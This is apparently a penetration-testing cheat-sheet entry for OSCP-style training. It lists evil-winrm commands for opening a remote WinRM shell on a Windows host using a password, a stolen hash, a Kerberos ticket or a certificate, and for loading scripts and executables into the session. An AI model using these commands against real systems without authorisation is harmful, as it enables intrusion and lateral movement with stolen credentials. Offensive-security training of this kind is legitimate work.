---
variants:
  - label: creds
    command: |
      evil-winrm -i $IP -u $USER -p $PASSWORD
  - label: hash
    command: |
      evil-winrm -i $IP -u $USER -H $HASH
  - label: ticket
    command: |
      evil-winrm -i $IP -u $USER -k
  - label: cert
    command: |
      evil-winrm -i $IP -c pub.pem -k priv.pem -S -r $DOMAIN
  - label: scripts
    command: |
      evil-winrm -i $IP -u $USER -p $PASSWORD -s /scripts -e /executables
description: Interactive WinRM shell, by auth method, with script and executable loading
os: [Linux]
category: [oscp, cli]
have: [hash, ticket, cert]
service: [WinRM]
phase: [Exploitation, LateralMovement]
references:
  - https://www.kali.org/tools/evil-winrm/
  - https://github.com/Hackplayers/evil-winrm
---
